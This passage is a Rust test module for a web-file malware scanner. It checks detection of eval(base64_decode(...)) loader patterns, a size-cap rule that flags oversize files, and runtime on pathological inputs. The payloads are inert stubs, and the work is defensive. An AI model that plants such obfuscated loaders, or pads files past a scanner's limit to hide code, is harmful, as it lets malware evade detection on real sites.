        assert!(inspect("a.php", &src).is_empty());
    }

    #[test]
    fn php_rules_do_not_run_on_js() {
        let mut src = b"var d=\"".to_vec();
        src.extend(std::iter::repeat_n(b'a', 4000));
        src.extend_from_slice(b"\";eval(base64_decode('x'));");
        assert!(inspect("a.js", &src).is_empty());
    }

    #[test]
    fn unknown_file_types_are_not_inspected() {
        assert!(inspect("a.txt", b"eval(base64_decode('x'));").is_empty());
        assert!(inspect("a", b"eval(base64_decode('x'));").is_empty());
    }

    #[test]
    fn oversize_inspected_files_are_reported_not_skipped() {
        let big = vec![b' '; INSPECT_MAX_BYTES + 1];
        for p in ["a.php", "a.js", "a.mjs", "a.cjs", "a.html", "a.htm"] {
            let h = inspect(p, &big);
            assert_eq!(ids(&h), ["too_large_to_inspect"], "{p}");
            assert_eq!(h[0].severity, Severity::Medium);
            // Exactly at the cap is inspected, not flagged.
            assert!(inspect(p, &big[..INSPECT_MAX_BYTES]).is_empty(), "{p}");
        }
        // Types that are never inspected stay silent.
        assert!(inspect("a.txt", &big).is_empty());
    }

    #[test]
    fn loader_appended_past_the_cap_is_not_read_as_clean() {
        let mut big = vec![b' '; INSPECT_MAX_BYTES];
        big.extend_from_slice(fx!("appended_js_loader.js"));
        let h = inspect("wp-content/themes/x/bundle.js", &big);
        assert_eq!(ids(&h), ["too_large_to_inspect"]);
    }

    #[test]
    fn hit_inside_the_cap_survives_oversize_input() {
        let mut big = b"<?php eval(base64_decode('x'));".to_vec();
        big.resize(INSPECT_MAX_BYTES + 10, b' ');
        let h = inspect("a.php", &big);
        assert!(ids(&h).contains(&"eval_decoder"));
        assert!(ids(&h).contains(&"too_large_to_inspect"));
    }

    #[test]
    fn hostile_inputs_stay_linear() {
        let n = INSPECT_MAX_BYTES;
        let inputs: Vec<Vec<u8>> = vec![
            // Many quote starts each followed by a long base64 run.
            "'aaaaaaaaaaaaaaaa".repeat(n / 17).into_bytes(),
            // Opening forms that never complete.
            "eval(   ".repeat(n / 8).into_bytes(),
            "createElement('script')".repeat(n / 23).into_bytes(),
            "http://".repeat(n / 7).into_bytes(),
            "eval(@(((((".repeat(n / 11).into_bytes(),
            vec![b'A'; n],
            vec![b'"'; n],
        ];
        let started = std::time::Instant::now();
        for src in &inputs {
            for p in ["a.php", "a.js"] {
                let h = inspect(p, src);
                assert!(h.len() <= MAX_HITS);
            }
        }
        assert!(started.elapsed().as_secs() < 60, "{:?}", started.elapsed());
    }
}
